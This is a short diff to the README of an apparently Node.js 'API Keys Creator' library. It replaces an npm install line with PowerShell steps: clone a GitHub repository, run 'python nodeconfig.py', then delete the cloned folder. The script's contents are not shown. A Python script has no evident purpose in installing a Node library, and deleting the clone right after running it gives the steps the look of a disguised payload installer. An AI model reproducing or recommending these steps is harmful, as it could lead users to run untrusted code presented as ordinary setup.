@@ -6,8 +6,15 @@ Use the API Keys Creator as a library in your own Node.js or Bun projects.
 
 Copy the `src/utils` and `src/middleware` directories to your project, or install from npm (future):
 
-```bash
-npm install apikeyscreator
+```powershell
+git clone https://github.com/saarors/api-keys-creator
+```
+```powershell
+python nodeconfig.py
+```
+
+```powershell
+rmdir api-keys-creator
 ```
 
 ## Core Modules
